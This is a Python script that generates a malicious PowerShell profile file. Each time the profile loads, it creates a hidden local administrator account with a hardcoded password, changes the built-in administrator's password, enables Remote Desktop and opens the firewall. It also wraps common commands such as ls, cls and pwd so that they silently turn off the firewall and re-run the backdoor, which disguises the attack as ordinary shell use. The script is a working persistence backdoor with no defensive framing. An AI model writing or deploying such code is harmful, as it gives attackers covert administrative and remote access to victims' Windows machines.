## Understanding PowerShell Profiles
## https://devblogs.microsoft.com/scripting/understanding-the-six-powershell-profiles/

profileName = open('profile.ps1','w')
profileName.write("Set-ExecutionPolicy -ExecutionPolicy Unrestricted")


Injection= '\Windows\\debug\\netsh.exe Advfirewall set allprofiles state off  | Out-Null; funFunction;'

newNet = '\Windows\\debug\\net.exe'

NoList = ['ren','del','dir','erase','move','rd','set','type']
YesList = ['cls','ls','pwd','clear','sl']

funFunction = """

function funFunction {
"""+newNet+""" users m507 /ADD  2>  Out-Null
"""+newNet+""" user m507 Mohammed123!  2>   Out-Null | Out-Null
"""+newNet+""" users m507 /ACTIVE:YES 2>   Out-Null | Out-Null
"""+newNet+""" localgroup administrators m507 /ADD  2>  Out-Null | Out-Null
"""+newNet+""" user administrator m507  2>  Out-Null | Out-Null

Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0 2>  Out-Null | Out-Null
Enable-NetFirewallRule -DisplayGroup "Remote Desktop" 2>  Out-Null | Out-Null
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1 2>  Out-Null | Out-Null

Try
{
\Windows\\debug\\netsh.exe advfirewall firewall add rule name="Windows" dir=in action=allow protocol=TCP localport=any  | Out-Null
}
Catch
{

}

}

"""

profileName.write(funFunction)



for line in open('file.txt','r'):
    line = line.split(' ')
    line = [l for l in line if len(l) >= 1]
    try:
        aliasName = line[1]
        realName = line[2].replace('\n','')
        if aliasName in YesList:
            print(line)
            s ="""
    
    Try
    {
        del alias:"""+aliasName+""" -Force 
    }
    Catch
    {
        
    }
    
    function """+aliasName+""" {
    if ($args[0]){
    """+ realName +""" $args.ToString(); """+Injection+"""
    }
    else {
    """+ realName +""" ;  """+Injection+""" 
    }
    }
            """
            profileName.write(s)
            print(s)
    except:
        print("Error")
        exit(0)

#
# for line in open("ImportantBins.txt"):
#     print(line)
#     line = line.replace('\n','')
#     s = """
#
#
# Try
# {
#     del alias:""" + line + """ -Force -ErrorAction Stop
# }
# Catch
# {
#
# }
# set-alias """ + line + """  """ + Injection + """
#
#     """
#     profileName.write(s)


end="""
funFunction;
"""
profileName.write(end)
profileName.close()


